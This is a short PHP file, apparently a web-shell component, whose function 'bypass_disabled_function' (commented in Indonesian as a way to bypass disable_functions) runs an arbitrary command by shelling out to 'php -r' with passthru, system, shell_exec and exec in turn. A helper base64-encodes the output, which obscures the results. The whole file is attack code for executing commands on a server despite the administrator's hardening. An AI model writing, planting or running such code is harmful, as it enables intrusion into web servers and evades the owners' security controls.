<?php
function bypass_disabled_function($cmd) {
    // Opsi untuk bypass `disable_function` dengan teknik tertentu
    $output = '';
    $methods = [
        "php -r 'passthru(\"$cmd\");'",
        "php -r 'system(\"$cmd\");'",
        "php -r 'shell_exec(\"$cmd\");'",
        "php -r 'exec(\"$cmd\");'",
    ];

    foreach ($methods as $method) {
        $output = shell_exec($method);
        if ($output) break;
    }
    return $output;
}

function encode_output($data) {
    return base64_encode($data);
}
?>
